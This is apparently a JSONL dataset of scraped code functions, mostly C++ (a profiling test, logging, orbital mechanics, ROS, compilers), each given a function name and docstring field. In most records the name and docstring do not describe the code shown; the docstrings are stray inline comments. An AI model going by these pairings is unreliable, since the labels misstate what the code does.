{"content":"{'function_name': 'TEST', 'docstring': '\/\/ is collected from an \"-O2\" binary, this is a source drift.', 'code': 'TEST(LlvmPropellerWholeProgramInfoBbInfoTest, TestMultiplePerfDataFiles) {\\n  auto init_whole_program_info = [](const std::vector<std::string> &perfs)\\n      -> std::unique_ptr<PropellerWholeProgramInfo> {\\n    PropellerOptionsBuilder options_builder;\\n    options_builder.SetBinaryName(\\n        GetAutoFdoTestDataFilePath(\"propeller_sample_1.bin\"));\\n    std::for_each(perfs.begin(), perfs.end(),\\n                  [&options_builder](const std::string &perf) {\\n                    options_builder.AddPerfNames(perf);\\n                  });\\n    const PropellerOptions options(options_builder);\\n    std::unique_ptr<PropellerWholeProgramInfo> wpi =\\n        PropellerWholeProgramInfo::Create(options);\\n    EXPECT_NE(wpi.get(), nullptr);\\n    EXPECT_TRUE(wpi->CreateCfgs());\\n    return wpi;\\n  };\\n\\n  std::string perf1 =\\n      GetAutoFdoTestDataFilePath(\"propeller_sample_1.perfdata1\");\\n  std::string perf2 =\\n      GetAutoFdoTestDataFilePath(\"propeller_sample_1.perfdata2\");\\n  auto wpi1 = init_whole_program_info(std::vector<std::string>{perf1});\\n  auto wpi2 = init_whole_program_info(std::vector<std::string>{perf2});\\n  auto wpi12 = init_whole_program_info(std::vector<std::string>{perf1, perf2});\\n\\n  \/\/ The run for perf2 is a superset of the run for perf1. Thus cfg2 has more\\n  \/\/ nodes (hot nodes) than cfg1. However, perf1 + perf2 includes as many hot\\n  \/\/ nodes as perf2.\\n  ControlFlowGraph *cfg1 = wpi1->cfgs().at(\"main\").get();\\n  ControlFlowGraph *cfg2 = wpi2->cfgs().at(\"main\").get();\\n  ControlFlowGraph *cfg12 = wpi12->cfgs().at(\"main\").get();\\n  EXPECT_GE(cfg2->nodes().size(), cfg1->nodes().size());\\n  EXPECT_EQ(cfg2->nodes().size(), cfg12->nodes().size());\\n\\n  std::set<std::pair<uint64_t, uint64_t>> edge_set1;\\n  std::set<std::pair<uint64_t, uint64_t>> edge_set2;\\n  std::set<std::pair<uint64_t, uint64_t>> edge_set12;\\n  auto initialize_edge_set =\\n      [](ControlFlowGraph *cfg,\\n         std::set<std::pair<uint64_t, uint64_t>> &edge_set) {\\n        for (auto &edge : cfg->intra_edges())\\n          edge_set.emplace(edge->src()->symbol_ordinal(),\\n                           edge->sink()->symbol_ordinal());\\n      };\\n  initialize_edge_set(cfg1, edge_set1);\\n  initialize_edge_set(cfg2, edge_set2);\\n  initialize_edge_set(cfg12, edge_set12);\\n\\n  std::set<std::pair<uint64_t, uint64_t>> sym_diff;\\n  std::set_symmetric_difference(edge_set1.begin(), edge_set1.end(),\\n                                edge_set2.begin(), edge_set2.end(),\\n                                std::inserter(sym_diff, sym_diff.begin()));\\n\\n  \/\/ Perfdata 1 & 2 contain different edge sets, this is because perfdata2 is\\n  \/\/ collected with an additional test run argument that directs the binary to\\n  \/\/ run in a different code path.  Refer to \"propeller_sample_1.c\"  block under\\n  \/\/ \"if (argc > 1) {\".\\n\\n  \/\/ edges constructed from perf1 differs from those constructed from perf2.\\n  EXPECT_FALSE(sym_diff.empty());\\n\\n  std::set<std::pair<uint64_t, uint64_t>> union12;\\n  std::set_union(edge_set1.begin(), edge_set1.end(), edge_set2.begin(),\\n                 edge_set2.end(), std::inserter(union12, union12.begin()));\\n  \/\/ The union of edges constructed from perf1 and perf2 separately equals to\\n  \/\/ those constructed from perf1 and perf2 together.\\n  EXPECT_EQ(union12, edge_set12);\\n\\n  auto accumutor = [](uint64_t acc,\\n                      const std::unique_ptr<CFGEdge> &e) -> uint64_t {\\n    return acc + e->weight();\\n  };\\n  uint64_t weight1 = std::accumulate(cfg1->intra_edges().begin(),\\n                                     cfg1->intra_edges().end(), 0, accumutor);\\n  uint64_t weight2 = std::accumulate(cfg2->intra_edges().begin(),\\n                                     cfg2->intra_edges().end(), 0, accumutor);\\n  uint64_t weight12 = std::accumulate(cfg12->intra_edges().begin(),\\n                                      cfg12->intra_edges().end(), 0, accumutor);\\n  \/\/ The sum of weights collected from perf file 1 & 2 separately equals to the\\n  \/\/ sum of weights collected from perf file 1 & 2 in oneshot.\\n  EXPECT_EQ(weight1 + weight2, weight12);\\n}'}","id":2282}
{"content":"{'function_name': 'LogRecord', 'docstring': '\/\/char\u5b57\u7b26\u8f6c\u6362\u4e3awchar,strWsysinfor', 'code': 'BOOL LogFileCreate(std::ofstream& oFile)\\n\\n{\\n\\n\\t\/\/\u521b\u5efa\u6587\u4ef6\u540d\\n\\n\\tSYSTEMTIME sys;\\n\\n\\tchar strFileName[34] = { 0 };\\n\\n\\tGetLocalTime(&sys);\\n\\n\\tsprintf_s(strFileName, sizeof(strFileName), \"\\\\\\\\%d-%d-%d\", sys.wYear, sys.wMonth, sys.wDay);\\n\\n\\tstrcat_s(strFileName, sizeof(strFileName), \".txt\");\\n\\n\\t\/\/\u5224\u65ad\u5f53\u524dLogFile\u6587\u4ef6\u5939\u662f\u5426\u5b58\u5728\u3002\\n\\n\\tTCHAR exeFullPath[MAX_PATH] = { 0 };\\n\\n\\tGetCurrentDirectory(MAX_PATH, exeFullPath);\\n\\n\\tchar strFilePath[MAX_PATH] = { 0 };\\n\\n\\tWideCharToMultiByte(CP_ACP, 0, exeFullPath, MAX_PATH, strFilePath, MAX_PATH, 0, 0);\\n\\n\\tstrcat_s(strFilePath, sizeof(strFilePath), \"\\\\\\\\LogFile\");\\n\\n\\tMultiByteToWideChar(CP_ACP, 0, strFilePath, sizeof(strFilePath), exeFullPath, MAX_PATH);\\n\\n\\tCreateDirectory(exeFullPath, NULL);\\n\\n\\tstrcat_s(strFilePath, sizeof(strFilePath), strFileName);\\n\\n\\toFile.open(strFilePath, std::ofstream::out | std::ofstream::app);\\n\\n\\tif (oFile.bad())\\n\\n\\t{\\n\\n\\t\\treturn FALSE;\\n\\n\\t}\\n\\n\\treturn TRUE;\\n\\n}'}","id":2285}
{"content":"{'function_name': 'edit_distance', 'docstring': '\/\/\u521d\u59cb\u5316', 'code': 'int main(int argc, const char *argv[])\\n{\\n    string s1(\"\u4f60\");\\n    string s2(\"\u6211\");\\n    uint32_t *ascii1 = new uint32_t;\\n    uint32_t *ascii2 = new uint32_t;\\n    const char *str1 = new char;\\n    str1 = \"\u4f60\";\\n    const char *str2 = new char;\\n    str2 = \"\u5feb\";\\n    cout << str1 << str2 << endl;\\n    bool a = utf8toascii(str1, ascii1);\\n    cout << a <<ascii1 << endl;\\n    bool b = utf8toascii(str2, ascii2);\\n    cout << b <<ascii2 << endl;\\n    uint32_t ret = edit_distance(ascii1, ascii2);\\n  \/\/  char *convert = new char;\\n  \/\/  int length = asciitoutf8(ascii1, convert);\\n  \/\/  cout << convert << endl;\\n    cout << ret << endl;\\n  \/\/  cout << length << endl;\\n    return 0;\\n}'}","id":2296}
{"content":"{'function_name': 'PyContainerWidget', 'docstring': '\/\/ Set applicable values.', 'code': 'static auto PyRowWidget(PyObject* self, PyObject* args, PyObject* keywds)\\n    -> PyObject* {\\n  BA_PYTHON_TRY;\\n\\n  PyObject* size_obj{Py_None};\\n  PyObject* pos_obj{Py_None};\\n  PyObject* background_obj{Py_None};\\n  PyObject* selected_child_obj{Py_None};\\n  PyObject* visible_child_obj{Py_None};\\n  PyObject* parent_obj{Py_None};\\n  PyObject* edit_obj{Py_None};\\n  ContainerWidget* parent_widget{};\\n  PyObject* claims_left_right_obj{Py_None};\\n  PyObject* claims_tab_obj{Py_None};\\n  PyObject* selection_loops_to_parent_obj{Py_None};\\n\\n  static const char* kwlist[] = {\"edit\",          \"parent\",\\n                                 \"size\",          \"position\",\\n                                 \"background\",    \"selected_child\",\\n                                 \"visible_child\", \"claims_left_right\",\\n                                 \"claims_tab\",    \"selection_loops_to_parent\",\\n                                 nullptr};\\n\\n  if (!PyArg_ParseTupleAndKeywords(\\n          args, keywds, \"|OOOOOOOOOO\", const_cast<char**>(kwlist), &edit_obj,\\n          &parent_obj, &size_obj, &pos_obj, &background_obj,\\n          &selected_child_obj, &visible_child_obj, &claims_left_right_obj,\\n          &claims_tab_obj, &selection_loops_to_parent_obj))\\n    return nullptr;\\n\\n  if (!g_base->CurrentContext().IsEmpty()) {\\n    throw Exception(\"UI functions must be called with no context set.\");\\n  }\\n\\n  \/\/ Grab the edited widget or create a new one.\\n  Object::Ref<RowWidget> widget;\\n  if (edit_obj != Py_None) {\\n    widget = dynamic_cast<RowWidget*>(UIV1Python::GetPyWidget(edit_obj));\\n    if (!widget.Exists()) {\\n      throw Exception(\"Invalid or nonexistent widget.\",\\n                      PyExcType::kWidgetNotFound);\\n    }\\n  } else {\\n    parent_widget = parent_obj == Py_None\\n                        ? g_ui_v1->screen_root_widget()\\n                        : dynamic_cast<ContainerWidget*>(\\n                            UIV1Python::GetPyWidget(parent_obj));\\n    if (!parent_widget) {\\n      throw Exception(\"invalid or nonexistent parent widget.\",\\n                      PyExcType::kWidgetNotFound);\\n    }\\n    widget = Object::New<RowWidget>();\\n  }\\n\\n  \/\/ Set applicable values.\\n  if (size_obj != Py_None) {\\n    Point2D p = Python::GetPyPoint2D(size_obj);\\n    widget->SetWidth(p.x);\\n    widget->SetHeight(p.y);\\n  }\\n  if (pos_obj != Py_None) {\\n    Point2D p = Python::GetPyPoint2D(pos_obj);\\n    widget->set_translate(p.x, p.y);\\n  }\\n\\n  if (background_obj != Py_None) {\\n    widget->set_background(Python::GetPyBool(background_obj));\\n  }\\n  if (selected_child_obj != Py_None) {\\n    widget->SelectWidget(UIV1Python::GetPyWidget(selected_child_obj));\\n  }\\n  if (visible_child_obj != Py_None) {\\n    widget->ShowWidget(UIV1Python::GetPyWidget(visible_child_obj));\\n  }\\n  if (claims_left_right_obj != Py_None) {\\n    widget->set_claims_left_right(Python::GetPyBool(claims_left_right_obj));\\n  }\\n  if (claims_tab_obj != Py_None) {\\n    widget->set_claims_tab(Python::GetPyBool(claims_tab_obj));\\n  }\\n  if (selection_loops_to_parent_obj != Py_None) {\\n    widget->set_selection_loops_to_parent(\\n        Python::GetPyBool(selection_loops_to_parent_obj));\\n  }\\n\\n  \/\/ If making a new widget, add it to the parent.\\n  if (edit_obj == Py_None) {\\n    g_ui_v1->AddWidget(widget.Get(), parent_widget);\\n  }\\n\\n  return widget->NewPyRef();\\n\\n  BA_PYTHON_CATCH;\\n}'}","id":2297}
{"content":"{'function_name': 'rv2ee', 'docstring': '\/\/\u8f6c\u6362\u5230[0,2pi)\u4e2d', 'code': 'void rv2mee(int&flag, double* mee, int& orbtype, const double* RV, double mu, double epsilon)\\n{\\n\\tflag=0;\\n\\tif(mu<=0.0)\\n\\t\\treturn;\\n\\tint i;\\n\\n\\tdouble R[3]={RV[0], RV[1], RV[2]};\\n\\tdouble V[3]={RV[3], RV[4], RV[5]};\\n\\tdouble radius=V_Norm2(R, 3);\/\/\u8ddd\u79bb\\n\\tdouble velocity=V_Norm2(V, 3);\/\/\u901f\u5ea6\\n\\tassert(radius>=epsilon&&velocity>=epsilon);\\n\\tdouble unitR[3];\\n\\tfor(i=0;i<3;i++) unitR[i]=R[i]\/radius;\/\/\u5f84\u5411\u5355\u4f4d\u77e2\u91cf    \\n\\tdouble unitV[3];\\n\\tfor(i=0;i<3;i++) unitV[i]=V[i]\/velocity;\/\/\u5207\u5411\u5355\u4f4d\u77e2\u91cf\\n\\tdouble hvector[3];\\n\\tV_Cross(hvector,unitR,unitV);\\n\\tdouble h=radius*velocity*V_Norm2(hvector, 3);\/\/\u89d2\u52a8\u91cf\u503c\\n\\tassert(h>=epsilon);\\n\\tdouble unith[3];\\n\\tfor(i=0;i<3;i++) unith[i]=hvector[i]\/V_Norm2(hvector, 3);\/\/\u8f68\u9053\u9762\u6cd5\u5411\u5355\u4f4d\u77e2\u91cf\\n\\t\\n\\t\/\/ unith=[sin(i)*sin(OMEGA),\\n\\t\/\/       -sin(i)*cos(OMEGA),\\n\\t\/\/       cos(i)];\\n\\t\/\/\u504f\u5fc3\u7387\u77e2\u91cf\\t\\n\\tdouble evector[3];\\n\\tV_Cross(evector, unitV, unith);\\n\\tfor(i=0;i<3;i++) evector[i]=(velocity*h\/mu)*evector[i]-unitR[i];\\t\\n\\t\/\/\u534a\u80fd\u5f84\u65b9\u5411\u77e2\u91cf,\u6a21\u4e3ae\\n\\tdouble qvector[3];\\n\\tV_Cross(qvector,unith,evector);\\n\\t\/\/\u5b9a\u4e49\u7684\u4e00\u4e2a\u77e2\u91cf\\n\\tdouble unitA[3];\\n\\tfor(i=0;i<3;i++) unitA[i]=h\/mu*V[i]-qvector[i];\\n\\t\/\/\u57fa\u672c\u5173\u7cfb\u5f0f\\n\\t\/\/ evector=e*[cos(omega)*cos(OMEGA)-sin(omega)*sin(OMEGA)*cos(i),\\n\\t\/\/            cos(omega)*sin(OMEGA)+sin(omega)*cos(OMEGA)*cos(i),\\n\\t\/\/            sin(omega)*sin(i)];\\n\\t\/\/ qvector=e*[-sin(omega)*cos(OMEGA)-cos(omega)*sin(OMEGA)*cos(i),\\n\\t\/\/            -sin(omega)*sin(OMEGA)+cos(omega)*cos(OMEGA)*cos(i),\\n\\t\/\/            cos(omega)*sin(i)];\\n\\t\/\/ unitR=[cos(OMEGA)*cos(omega+f)-cos(i)*sin(OMEGA)*sin(omega+f),\\n\\t\/\/        sin(OMEGA)*cos(omega+f)+cos(i)*cos(OMEGA)*sin(omega+f),\\n\\t\/\/        sin(i)*sin(omega+f)];\\n\\t\/\/ unitA=[-cos(OMEGA)*sin(omega+f)-cos(i)*sin(OMEGA)*cos(omega+f),\\n\\t\/\/        -sin(OMEGA)*sin(omega+f)+cos(i)*cos(OMEGA)*cos(omega+f),\\n\\t\/\/         sin(i)*cos(omega+f)];\\n\\t\/\/\u63a8\u5bfc\u5f97\u51fa\\n\\t\/\/evector[0]+orbtype*qvector[1]=(1+orbtype*cos(i))*e*cos(omega+OMEGA);\\n\\t\/\/orbtype*evector[1]-qvector[0]=(1+orbtype*cos(i))*e*sin(omega+OMEGA);\\n\\t\/\/unith[0]=(1+orbtype*cos(i))*(tan(i\/2))^orbtype*sin(OMEGA);\\n\\t\/\/unith[1]=-(1+orbtype*cos(i))*(tan(i\/2))^orbtype*cos(OMEGA);\\n\\t\/\/ unitR[0]+orbtype*unitA[1]=(1+orbtype*cos(i))*cos(omega+OMEGA+f);\\n\\t\/\/ unitR[1]-orbtype*unitA[0]=(1+orbtype*cos(i))*sin(omega+OMEGA+f);\\n\\n\\tmee[0]=h*h\/mu;\/\/p\\n\\torbtype=1;\\n\\tif(unith[2]<0.0)\\n\\t\\torbtype=-1;\\n\\tdouble cosiadd1=1.0+orbtype*unith[2];\\n\\tmee[1]=(evector[0]+orbtype*qvector[1])\/cosiadd1;\/\/f\\n\\tmee[2]=(orbtype*evector[1]-qvector[0])\/cosiadd1;\/\/g\\n\\tmee[3]=-unith[1]\/cosiadd1;\/\/h\\n\\tmee[4]=unith[0]\/cosiadd1;\/\/k\\n\\tmee[5]=atan2(orbtype*unitR[1]-unitA[0], unitR[0]+orbtype*unitA[1]);\/\/L\\n\\t\/\/\u8f6c\u6362\u5230[0,2pi)\u4e2d\\n\\tmee[5]=fmod(mee[5], D2PI);\\n\\tif(mee[5]<0.0)\\n\\t\\tmee[5]+=D2PI;\\n\\tflag=1;\\n\\treturn;\\n}'}","id":2308}
{"content":"{'function_name': 'convertTof', 'docstring': '\/\/ Converter y', 'code': 'int findQuadrant(cv::Mat& image, cv::Point point) {\\n    \\n    \/\/\/ Encontrar o quadrante\\n    \/\/ Quadrante 1 ou 2\\n    if (point.y >= image.rows\/2) {\\n        if (point.x >= image.cols\/2){\\n            return 1;\\n        } else {\\n            return 2;\\n        }\\n    \/\/ quadrante 3 ou 4\\n    } else {\\n        if (point.x < image.cols\/2) {\\n            return 3;\\n        } else {\\n            return 4;\\n        }\\n    }\\n}'}","id":2312}
{"content":"{'function_name': 'StateCallback', 'docstring': '\/\/\\telse cout << \"state written to FIFO \" << nw << \" bytes\" << endl;', 'code': 'int main(int argc, char **argv)\\n{\\n\\t\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\n\\t\/\/ read parameters from xml file\\n\\tif (argc!=2) {\\n\\t\\tcout << \"requires xml_file as argument\" << endl;\\n\\t\\texit(-1);\\n\\t}\\n\\tifstream is(argv[1]);\\n\\tusing boost::property_tree::ptree;\\n\\tptree pt;\\n\\tif (!is.is_open()) {\\n\\t\\tcout << \"file not found\" << endl;\\n\\t\\texit(-1);\\n\\t}\\n\\tread_xml(is, pt);\\n\\t\\n\\t\/\/ task parameters\\n\\ttakeoffx = pt.get<double>(\"takeoffx\");\\n\\ttakeoffy = pt.get<double>(\"takeoffy\");\\n\\ttakeoffz = pt.get<double>(\"takeoffz\");\\n\\tidunit = pt.get<string>(\"idunit\");\\n\\t\\n\\t\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\n\\t\/\/ open FIFO for writing states\\n\\tpid_t pid;\\n\\tstring myfifo(\"\/tmp\/pi_fifo\");\\n\\tif (access(myfifo.c_str(), F_OK) == -1) {\\n\\t\\tcerr << \"fifo does not exist, launch PIROS first\" << endl;\\n\\t\\treturn EXIT_FAILURE;\\n\\t}\\n\\tif ((fd = open(myfifo.c_str(), O_WRONLY))<0) {\\n\\t\\tcout << \"open failed\" << endl;\\n\\t\\treturn EXIT_FAILURE;\\n\\t}\\n\\telse cout << \"Opened successfully\" << endl;\\n\\n\\tcout << \"writing FIFO\" << endl;\\n\\tstring msgfifo = string(\"XXXXX\");\\n\\tint nw = write(fd, msgfifo.c_str(), SIZE_MSG);\\n\\tif (nw<0)\\tcerr << \"write errror\" << endl;\\n\\telse cout << \"state written to FIFO \" << nw << \" bytes\" << endl;\\n\\n\\n\/\/\\tcout << \"blocked in write\" << endl;\\n\/\/\\tcout << write(fd, idunit.c_str(), sizeof(idunit.c_str()) << endl;\\n\/\/\\tcout << \"state written to FIFO\" << endl;\\n\\n\\texit(-1);\\n\\t\\n\\t\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\n\\t\/\/ initialize ROS\\n\\tstring nodestr = string(\"PINode\") + idunit;\\n  ros::init(argc, argv, nodestr.c_str());\\n\\tros::NodeHandle n;\\n\\n\\t\/\/ Create a client for interacting with the Simulator insert and Resume services\\n  ros::ServiceClient srvInsert = n.serviceClient<sim::Insert>(\"\/simulator\/Insert\");\\n  ros::ServiceClient srvResume = n.serviceClient<sim::Resume>(\"\/simulator\/Resume\");\\n  ros::ServiceClient srvPause  = n.serviceClient<sim::Pause> (\"\/simulator\/Pause\");\\n\\n  \/\/ Subscribe to the state of the quadrotor\\n\\tstring estimate = string(\"\/hal\/\") + idunit + string(\"\/Estimate\");\\n  cout << estimate << endl;\\n\\tros::Subscriber topState = n.subscribe(estimate.c_str(), 1000, StateCallback);\\n\\n  \/\/ Create a resume message, which takes no arguments\\n  sim::Pause msgPause;\\n\\n  \/\/ Call the client with this message\\n  if (!srvPause.call(msgPause)) {\\n    ROS_FATAL(\"Failed to pause the simulator\");\\n    return 1;\\n  }\\n\\n  \/\/ Create a message instructing a quadrotor UAV0 to be inserted \\n  sim::Insert msgInsert;\\n  msgInsert.request.model_name = idunit;\\n  msgInsert.request.model_type = \"model:\/\/hummingbird\";\\n  \\n  \/\/ Call the client with this message\\n  if (!srvInsert.call(msgInsert)) {\\n    ROS_FATAL(\"Failed to insert a hummingbird quadrotor into the simulator\");\\n    return 1;\\n  }\\n\\n  \/\/ You should now see the quadrotor\\n  ROS_INFO(\"Successfully inserted the model into the world\");\\n\\n\\tsleep(5);\\n  ROS_INFO(\"AWAKE\");\\n  \/\/ Create a resume message, which takes no arguments\\n  sim::Resume msgResume;\\n\\n  \/\/ Call the client with this message\\n  if (!srvResume.call(msgResume)) {\\n    ROS_FATAL(\"Failed to resume the simulator\");\\n    return 1;\\n  }\\n\\n  \/\/ takeoff and velheight commands \\n\\tstring takeoff_cmd = string(\"hal\/\") + idunit + string(\"\/controller\/Takeoff\");\\n\\tsrvTakeOff = n.serviceClient<hal_quadrotor::Takeoff>(takeoff_cmd.c_str());\\n\\t\\n\\tstring velheight_cmd = string(\"hal\/\") + idunit + string(\"\/controller\/VelocityHeight\");\\n\\tsrvVelocityHeight = n.serviceClient<hal_quadrotor::VelocityHeight>(velheight_cmd.c_str()); \\n\\t\\n\\t\/\/ Keep going until ctl+c is pressed\\n  ros::spin();\\n\\n  \/\/ Success!\\n  return 0;\\n\\n}'}","id":2313}
{"content":"{'function_name': 'uniformOnSphere', 'docstring': '\/\/ [-1, 1]', 'code': 'Vec2f uniformOnDisk(const Vec2f &xi)\\n\\t{\\n\\t\\tVec2f xi_offset = {2 * xi[0] - 1, 2 * xi[1] - 1};\\t\/\/ map to [-1, 1]^2\\n\\t\\tif (xi_offset.x == 0 && xi_offset.y == 0) return {0, 0};\\n\\t\\treal phi, r;\\n\\t\\tif (fabsf(xi_offset.x) > fabsf(xi_offset.y)) {\\n\\t\\t\\tr = xi_offset.x;\\n\\t\\t\\tphi = xi_offset.y \/ xi_offset.x * M_PI_4F;\\n\\t\\t}\\n\\t\\telse {\\n\\t\\t\\tr = xi_offset.y;\\n\\t\\t\\tphi = M_PI_2F - xi_offset.x \/ xi_offset.y * M_PI_4F;\\n\\t\\t}\\n\\t\\treturn {r * cosf(phi), r * sinf(phi)};\\n\\t}'}","id":2316}
{"content":"{'function_name': 'CreateConv2D', 'docstring': '\/\/ Find the kernel tensor', 'code': 'StatusOr<poplar::program::Program> Create2DConvWithReverse(\\n    CompilerResources& res, const HloInstruction* inst,\\n    const xla::Shape& output_shape, TensorMap& tensor_map) {\\n  poplar::Graph& graph = GetGraph(res, inst);\\n\\n  poplar::program::Sequence prog;\\n\\n  \/\/ Find the input tensor\\n  TF_ASSIGN_OR_RETURN(poplar::Tensor in,\\n                      FindInstructionInput(tensor_map, res, inst, 0, prog));\\n\\n  \/\/ Find the kernel tensor\\n  TF_ASSIGN_OR_RETURN(poplar::Tensor kernel,\\n                      FindInstructionInput(tensor_map, res, inst, 1, prog));\\n\\n  TF_ASSIGN_OR_RETURN(poplin::ConvParams params,\\n                      GetConvolutionParameters(inst, 0, 1));\\n\\n  in = ShuffleConvolutionInputToPoplar(inst, in);\\n\\n  kernel = ShuffleConvolutionWeightsToPoplar(inst, kernel, true);\\n\\n  kernel = AddGroupsDimensionToWeights(params, kernel, true);\\n\\n  auto conv_type = GetConvClassificationType(inst, res.annotations);\\n\\n  auto out = conv_graph_caching::DoCachedConvolution(\\n      graph, res, in, kernel, params, conv_type, true,\\n      GetSingleShardingDeviceId(inst), prog, GetDebugName(inst));\\n\\n  out = ShuffleConvolutionOutputToTensorflow(inst, out);\\n\\n  TF_CHECK_OK(AddOutputTensor(tensor_map, inst, 0, out));\\n\\n  return prog;\\n}'}","id":2330}
{"content":"{'function_name': 'linear_solver_toyexample', 'docstring': '\/\/cout << \"residual = \" << res << endl;', 'code': 'NumericVector cg_solver_toyexample(NumericMatrix mle, NumericVector b)\\n{\\n    int n = b.size();\\n    int nml = mle.nrow();\\n    int k0=0, k1=0, kml=0;\\n    int kiter=0, niter=50000;\\n    double factor=0.0, res=0.0, eps=1.0e-10;\\n    double alpha=0.0, beta=0.0;\\n    NumericVector x(n);\\n    NumericVector r(n);\\n    NumericVector rcg(n);\\n    NumericVector d(n);\\n    \/\/ initial guess\\n    for(k0 = 0; k0 < n; k0++)\\n    {\\n        x[k0] = 0.0;\\n    }\\n    for(k0 = 0; k0 < n; k0++)\\n    {\\n        r[k0] = 0.0;\\n        d[k0] = 0.0;\\n    }\\n    niter = 10;\\n    for(kiter = 0; kiter < niter; kiter++)\\n    {\\n        for(k0 = 0; k0 < n; k0++)\\n        {\\n            r[k0] = b[k0];\\n            d[k0] = 0.0;\\n        }\\n        for(kml = 0; kml < nml; kml++)\\n        {\\n            r[(int)mle(kml, 0)] = r[(int)mle(kml, 0)] - mle(kml, 2) * x[(int)mle(kml, 1)];\\n        }\\n        for(kml = 0; kml < nml; kml++)\\n        {\\n            d[(int)mle(kml, 0)] += mle(kml, 2) * r[(int)mle(kml, 1)];\\n        }\\n        factor = 1.0 * mat_inner_product_toyexample(mle, r, r) \/ (inner_product_toyexample(d, d) + eps);\\n        for(k0 = 0; k0 < n; k0++)\\n        {\\n            x[k0] += factor * r[k0];\\n        }\\n        res = sqrt(inner_product_toyexample(r, r));\\n    }\\n    niter = 0;\\n    for(k0 = 0; k0 < n; k0 ++)\\n    {\\n        r[k0] = b[k0];\\n        rcg[k0] = 0.0;\\n    }\\n    for(kml = 0; kml < nml; kml ++)\\n    {\\n        r[(int)mle(kml, 0)] = r[(int)mle(kml, 0)] - mle(kml, 2) * x[(int)mle(kml, 1)];\\n    }\\n\\n    for(kml = 0; kml < nml; kml ++)\\n    {\\n        rcg[(int)mle(kml, 1)] = rcg[(int)mle(kml, 1)] + mle(kml, 2) * r[(int)mle(kml, 0)];\\n    }\\n\\n    for(k0 = 0; k0 < n; k0 ++)\\n    {\\n        d[k0] = rcg[k0];\\n    }\\n\\n    for(kiter = 0; kiter < niter; kiter++)\\n    {\\n        \/\/ calculation of alpha\\n        alpha = compute_alpha_toyexample(mle, d, rcg);\\n        \/\/ update of the solution vector\\n        for(k0 = 0; k0 < n; k0 ++)\\n        {\\n            x[k0] = x[k0] + alpha * d[k0];\\n            rcg[k0] = 0.0;\\n        }\\n        \/\/ update of the residual\\n        for(kml = 0; kml < nml; kml ++)\\n        {\\n            r[(int)mle(kml, 0)] = r[(int)mle(kml, 0)] - alpha * mle(kml, 2) * d[(int)mle(kml, 1)];\\n        }\\n        for(kml = 0; kml < nml; kml ++)\\n        {\\n            rcg[(int)mle(kml, 1)] = rcg[(int)mle(kml, 1)] + mle(kml, 2) * r[(int)mle(kml, 0)];\\n        }\\n        \/\/ update of the search direction\\n        beta = compute_beta_toyexample(mle, d, rcg);\\n        for(k0 = 0; k0 < n; k0++)\\n        {\\n            d[k0] = rcg[k0] - beta * d[k0];\\n        }\\n        res = sqrt(inner_product_toyexample(r, r));\\n        \/\/cout << \"residual = \" << res << endl;\\n    }\\n    \/\/cout << \"residual = \" << res << endl;\\n    return x;\\n}'}","id":2340}
{"content":"{'function_name': 'ReplaceOriginalOp', 'docstring': '\/\/ Update group', 'code': 'Array<Tensor> CacheWriteWithReLayout(Schedule sch, const Array<Tensor>& tensor_array,\\n                                     const std::string& scope) {\\n  size_t tensor_size = tensor_array.size();\\n  sch->InvalidateCache();\\n  Tensor tensor = tensor_array[0];\\n  Stage orig_stage = sch[tensor->op];\\n  const ComputeOpNode* compute = orig_stage->op.as<ComputeOpNode>();\\n\\n  std::unordered_set<IterVar> red_axis;\\n  Array<IterVar> new_axis;\\n  std::unordered_map<IterVar, Range> dom_map;\\n\\n  std::unordered_map<const VarNode*, PrimExpr> vsub;\\n  std::unordered_map<const VarNode*, PrimExpr> vsub2newvar;\\n  std::vector<PrimExpr> predicates;\\n\\n  PrepareAxisMapping(orig_stage, compute, &red_axis, &new_axis, &dom_map, &vsub, &vsub2newvar,\\n                     &predicates);\\n\\n  PrimExpr body;\\n  Array<PrimExpr> body_list;\\n  const tir::ReduceNode* first_reduce = nullptr;\\n  for (auto cbody : compute->body) {\\n    body = VarReplacer(vsub)(cbody);\\n    body = InjectPredicate(predicates, body);\\n    body = VarReplacer(vsub2newvar)(body);\\n    \/\/ Reduce nodes in ONE computeOp must be the same except value_index\\n    \/\/ This is right only if the original body ensures Reduce nodes are the same\\n    if (body->IsInstance<tir::ReduceNode>()) {\\n      const tir::ReduceNode* reduce_body = body.as<tir::ReduceNode>();\\n      if (first_reduce != nullptr) {\\n        ICHECK(ReduceEqual(reduce_body, first_reduce));\\n        body = tir::Reduce(first_reduce->combiner, first_reduce->source, first_reduce->axis,\\n                           first_reduce->condition, reduce_body->value_index, reduce_body->init);\\n      } else {\\n        first_reduce = reduce_body;\\n      }\\n    } else {\\n      ICHECK(first_reduce == nullptr) << \"cannot mix reduce and other node in ONE compute bodys\";\\n    }\\n    body_list.push_back(body);\\n  }\\n  \/\/ The reader args\\n  Array<PrimExpr> args;\\n  {\\n    \/\/ cache->compute\\n    std::unordered_map<IterVar, PrimExpr> value_map;\\n    for (IterVar iv : compute->axis) {\\n      value_map[iv] = iv->var;\\n    }\\n    te::PassDownIndex(orig_stage, dom_map, &value_map, true);\\n    for (IterVar iv : orig_stage->leaf_iter_vars) {\\n      if (red_axis.count(iv)) continue;\\n      args.push_back(value_map.at(iv));\\n    }\\n  }\\n  Operation cache_op =\\n      ComputeOp(compute->name + \".\" + scope, compute->tag, compute->attrs, new_axis, body_list);\\n\\n  Array<PrimExpr> cache_expr_list;\\n  for (size_t i = 0; i < tensor_size; i++) {\\n    Tensor cache_tensor = cache_op.output(i);\\n    cache_expr_list.push_back(cache_tensor(args));\\n  }\\n  Operation orig_new_op =\\n      ComputeOp(compute->name, compute->tag, compute->attrs, compute->axis, cache_expr_list);\\n  return ReplaceOriginalOp(sch, orig_stage, scope, cache_op, orig_new_op, tensor_size);\\n}'}","id":2345}
